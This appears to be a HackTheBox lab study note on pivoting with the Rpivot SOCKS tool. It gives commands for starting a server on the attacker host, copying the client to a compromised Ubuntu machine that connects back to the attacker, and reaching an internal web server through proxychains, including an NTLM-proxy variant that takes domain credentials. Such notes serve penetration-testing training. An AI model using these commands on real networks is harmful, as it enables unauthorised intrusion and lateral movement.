---
title: Web Server - Rpivot
draft: false
tags:
  - rpivot
---
**Rpivot** - SOCKS proxy tool written in Python for SOCKS tunneling. 

It binds a machine inside a corporate network to an external server and exposes the client local port on the server side. 

Scenario:

Attacker(10.10.15.5) -> Ubuntu(10.129.15.50,172.16.5.129) -> Webserver(172.16.5.135)

## Installation

```shell-session
jadu101@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git
```

## Rpivot - Server

On Attacker machine, rune the following command to start rpivot SOCKS proxy server:

```shell-session
jadu101@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Command above will allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.

## Rpivot - Client

Now that we have Rpivot server listening on port 9999, let's prepare Rpivot client.

We first have to transfer rpivot to the target:

```shell-session
jadu101@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

After transferring, run the client:

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

Above command runs the client and connects to attacker's port 9999.

## Proxychains

Now we have to configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attacker host. 


After configuring correctly, we can access the web server which is two network hops away:

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

Sometimes, organization have HTTP-Proxy with NTLM Authentication configured with the Domain Controller. If this is the case, we can provide NTLM authentication option as such:

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```